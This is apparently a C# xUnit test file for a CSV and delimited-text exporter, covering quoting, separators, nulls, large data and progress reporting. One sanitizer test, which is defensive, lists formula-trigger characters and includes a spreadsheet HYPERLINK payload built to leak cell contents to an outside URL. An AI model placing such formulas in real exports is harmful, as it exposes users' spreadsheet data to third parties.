using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Diagnostics;
using System.IO;
using System.Text;
using Moq;
using Xunit;

namespace DelimitedDataParser
{
    public partial class ExporterTest
    {
        [Fact]
        public void ExportReader_Can_Load_Input()
        {
            var reader = CreateDbDataReader();

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.NotNull(output);
        }

        [Fact]
        public void ExportReader_Fails_Without_Valid_Input()
        {
            var sut = new Exporter();

            var exception = Record.Exception(() => sut.ExportToString((DbDataReader)null));

            Assert.NotNull(exception);
            Assert.IsType<ArgumentNullException>(exception);
        }

        [Fact]
        public void ExportReader_Can_Parse_Empty_Fields()
        {
            var columns = new[]
            {
                "Column1",
                "Column2"
            };

            var rows = new[]
            {
                new[] { string.Empty, string.Empty }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Column1"",""Column2""" + Environment.NewLine
                + @""""",""""",
                output);
        }

        [Fact]
        public void ExportReader_Can_Parse_Empty_Table()
        {
            var reader = CreateDbDataReader();

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Empty(output);
        }

        [Fact]
        public void ExportReader_Can_Parse_Multiple_Rows()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @"""Data 1"",""Data 2""" + Environment.NewLine
                + @"""Data 3"",""Data 4""",
                output);
        }

        [Fact]
        public void ExportReader_Can_Parse_Null_Fields()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { null, "Data 1" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @""""",""Data 1""",
                output);
        }

        [Fact]
        public void ExportReader_Can_Parse_DbNull_Fields()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new object[] { DBNull.Value, "Data 1" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @""""",""Data 1""",
                output);
        }

        [Fact]
        public void ExportReader_Does_Not_Strip_Whitespace_From_Column_Names()
        {
            var columns = new[]
            {
                " Field 1",
                "Field 2 ",
                " Field 3 "
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@""" Field 1"",""Field 2 "","" Field 3 """, output);
        }

        [Fact]
        public void ExportReader_Outputs_Column_Names()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Field 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Changing_Field_Separator_Char_Colon()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                FieldSeparator = ':'
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "\"Field 1\":\"Field 2\"" + Environment.NewLine
                + "\"Data 1\":\"Data 2\"" + Environment.NewLine
                + "\"Data 3\":\"Data 4\"",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Changing_Field_Separator_Char_Pipe()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                FieldSeparator = '|'
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "\"Field 1\"|\"Field 2\"" + Environment.NewLine
                + "\"Data 1\"|\"Data 2\"" + Environment.NewLine
                + "\"Data 3\"|\"Data 4\"",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Changing_Field_Separator_Char_Space()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                FieldSeparator = ' '
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "\"Field 1\" \"Field 2\"" + Environment.NewLine
                + "\"Data 1\" \"Data 2\"" + Environment.NewLine
                + "\"Data 3\" \"Data 4\"",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Changing_Field_Separator_Char_Tab()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                FieldSeparator = '\t'
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "\"Field 1\"\t\"Field 2\"" + Environment.NewLine
                + "\"Data 1\"\t\"Data 2\"" + Environment.NewLine
                + "\"Data 3\"\t\"Data 4\"",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Column_Name_Containing_Carriage_Return()
        {
            var columns = new[]
            {
                "Field 1",
                "Fie\rld 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Fie" + "\r" + @"ld 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Column_Name_Containing_Comma()
        {
            var columns = new[]
            {
                "Field 1",
                "Fie,ld 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Fie,ld 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Column_Name_Containing_Full_New_Line()
        {
            var columns = new[]
            {
                "Field 1",
                "Fie" + Environment.NewLine + "ld 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Fie" + Environment.NewLine + @"ld 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Column_Name_Containing_Line_Feed()
        {
            var columns = new[]
            {
                "Field 1",
                "Fie\nld 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Fie" + "\n" + @"ld 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Column_Name_Containing_Quote()
        {
            var columns = new[]
            {
                "Field 1",
                @"Fie""ld 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Fie""""ld 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Column_Name_Containing_Reversed_New_Line()
        {
            var columns = new[]
            {
                "Field 1",
                "Fie\n\rld 2",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Fie" + "\n\r" + @"ld 2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Data_Containing_Full_New_Line()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Dat" + Environment.NewLine + "a 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @"""Dat" + Environment.NewLine + @"a 1"",""Data 2""" + Environment.NewLine
                + @"""Data 3"",""Data 4""",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Data_Containing_Quote()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { @"Data"" 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @"""Data"""" 1"",""Data 2""" + Environment.NewLine
                + @"""Data 3"",""Data 4""",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Data_Ending_With_Quote()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", @"Data 4""" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @"""Data 1"",""Data 2""" + Environment.NewLine
                + @"""Data 3"",""Data 4""""""",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Empty_Column_Name()
        {
            var columns = new[]
            {
                "Field 1",
                string.Empty,
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Column2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Empty_Last_Column_Name()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2",
                string.Empty
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Field 2"",""Column3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Large_Dataset()
        {
            var colCount = 1000;
            var rowCount = 1000;
            var columns = new List<string>();
            var expected = new StringBuilder();

            for (var i = 0; i < colCount; i++)
            {
                var column = "Col" + i.ToString();

                columns.Add(column);

                if (i > 0)
                {
                    expected.Append(',');
                }

                expected.AppendFormat("\"{0}\"", column);
            }

            var rows = new List<string[]>();

            for (var i = 0; i < rowCount; i++)
            {
                expected.Append(Environment.NewLine);

                var rowContent = new string[colCount];

                for (var j = 0; j < colCount; j++)
                {
                    rowContent[j] = GetRandomString(10);

                    if (j > 0)
                    {
                        expected.Append(',');
                    }

                    expected.AppendFormat("\"{0}\"", rowContent[j]);
                }

                rows.Add(rowContent);
            }

            Stopwatch stopwatch;
            string output;
            StringReader stringReader = null;

            try
            {
                stringReader = new StringReader(expected.ToString());

                using (var dataReader = new DelimitedDataReader(stringReader, Encoding.UTF8, ',', true, false))
                {
                    stringReader = null;

                    var sut = new Exporter();

                    stopwatch = Stopwatch.StartNew();
                    output = sut.ExportToString(dataReader);
                    stopwatch.Stop();
                }
            }
            finally
            {
                if (stringReader != null)
                {
                    stringReader.Dispose();
                }
            }

            Assert.Equal(expected.ToString(), output);
            Assert.True(stopwatch.ElapsedMilliseconds / 1000 < 1);
        }

        [Fact]
        public void ExportReader_Supports_Large_Cell_Content()
        {
            var cellContent = new string('a', 10000000);

            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", cellContent }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @"""Data 1"",""" + cellContent + @"""",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Multiple_Blank_Rows()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { string.Empty, string.Empty },
                new[] { string.Empty, string.Empty },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Field 1"",""Field 2""" + Environment.NewLine
                + @"""Data 1"",""Data 2""" + Environment.NewLine
                + @""""",""""" + Environment.NewLine
                + @""""",""""" + Environment.NewLine
                + @"""Data 3"",""Data 4""",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Not_Outputting_Column_Names()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                OutputColumnHeaders = false
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                @"""Data 1"",""Data 2""" + Environment.NewLine
                + @"""Data 3"",""Data 4""",
                output);
        }

        [Fact]
        public void ExportReader_Supports_Null_Column_Name()
        {
            var columns = new[]
            {
                "Field 1",
                null,
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""Column2"",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Quoted_Column_Name()
        {
            var columns = new[]
            {
                "Field 1",
                @"""Field 2""",
                "Field 3"
            };

            var reader = CreateDbDataReader(columns);

            var sut = new Exporter();

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(@"""Field 1"",""""""Field 2"""""",""Field 3""", output);
        }

        [Fact]
        public void ExportReader_Supports_Progress_Report()
        {
            var columns = new[]
            {
                "One"
            };

            var rows = new[]
            {
                new[] { "One" },
                new[] { "Two" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var progressReports = new List<int>();
            var progressMock = new Mock<IProgress<int>>();
            progressMock
                .Setup(m => m.Report(It.IsAny<int>()))
                .Callback<int>(p => progressReports.Add(p));

            var sut = new Exporter(progressMock.Object);

            _ = sut.ExportToString(reader.Object);

            Assert.Equal(1, progressReports[0]);
            Assert.Equal(2, progressReports[1]);
        }

        [Fact]
        public void ExportReader_Exports_Unquoted_Data()
        {
            var columns = new[]
            {
                "Field 1",
                "Field 2"
            };

            var rows = new[]
            {
                new[] { "Data 1", "Data 2" },
                new[] { "Data 3", "Data 4" }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                IncludeEscapeCharacters = false
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "Field 1,Field 2" + Environment.NewLine
                + "Data 1,Data 2" + Environment.NewLine
                + "Data 3,Data 4",
                output);
        }

        [Theory]
        [InlineData("=", "'=")]
        [InlineData("+", "'+")]
        [InlineData("-", "'-")]
        [InlineData("@", "'@")]
        [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"'=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")")]
        public void ExportReader_Sanitizer_Escapes_Blacklisted_Characters(string inputString, string expectedOutput)
        {
            var columns = new[] { "Field 1" };

            var rows = new[]
            {
                new[] { inputString }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                IncludeEscapeCharacters = false,
                SanitizeStrings = true
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "Field 1" + Environment.NewLine + expectedOutput,
                output);
        }

        [Theory]
        [InlineData("abcdef")]
        [InlineData("abc + def - ghi @ jkl")]
        [InlineData(" =")]
        [InlineData(" +")]
        [InlineData(" -")]
        [InlineData(" @")]
        public void ExportReader_Sanitizer_Does_Not_Escape_Safe_Input(string inputString)
        {
            var columns = new[] { "Field 1" };

            var rows = new[]
            {
                new[] { inputString }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                IncludeEscapeCharacters = false,
                SanitizeStrings = true
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "Field 1" + Environment.NewLine + inputString,
                output);
        }

        [Fact]
        public void ExportReader_Sanitizer_Ignores_Null_Values()
        {
            var columns = new[]
            {
                "One",
                "Two"
            };

            var rows = new[]
            {
                new string[] { null, null }
            };

            var reader = CreateDbDataReader(columns, rows);

            var sut = new Exporter
            {
                IncludeEscapeCharacters = false,
                SanitizeStrings = true
            };

            var output = sut.ExportToString(reader.Object);

            Assert.Equal(
                "One,Two" + Environment.NewLine
                + ",",
                output);
        }

        private static Mock<DbDataReader> CreateDbDataReader()
        {
            return CreateDbDataReader(new string[0], new string[0][]);
        }

        private static Mock<DbDataReader> CreateDbDataReader(string[] columns)
        {
            return CreateDbDataReader(columns, new string[0][]);
        }

        private static Mock<DbDataReader> CreateDbDataReader(string[] columns, object[][] rows)
        {
            if (columns == null)
            {
                throw new ArgumentNullException(nameof(columns));
            }

            if (rows == null)
            {
                throw new ArgumentNullException(nameof(rows));
            }

            var reader = new Mock<DbDataReader>();

            // Configure reader schema.
            var schema = CreateDataTable();

            AddColumn(schema, SchemaTableColumn.ColumnName);

            foreach (var column in columns)
            {
                AddRow(schema, column);
            }

            reader
                .Setup(o => o.GetSchemaTable())
                .Returns(schema);

            reader
                .SetupGet(o => o.FieldCount)
                .Returns(columns.Length);

            reader
                .Setup(o => o.GetName(It.IsAny<int>()))
                .Returns((int i) => columns[i]);

            // Configure reader data.
            reader
                .SetupGet(o => o.HasRows)
                .Returns(rows.Length > 0);

            var row = 0;

            reader
                .Setup(o => o.Read())
                .Returns(() => row < rows.Length)
                .Callback(() => row++);

            reader
                .Setup(o => o.GetValue(It.IsAny<int>()))
                .Returns((int i) => rows[row - 1][i]);

            reader
                .Setup(o => o.IsDBNull(It.IsAny<int>()))
                .Returns(false);

            return reader;
        }
    }
}
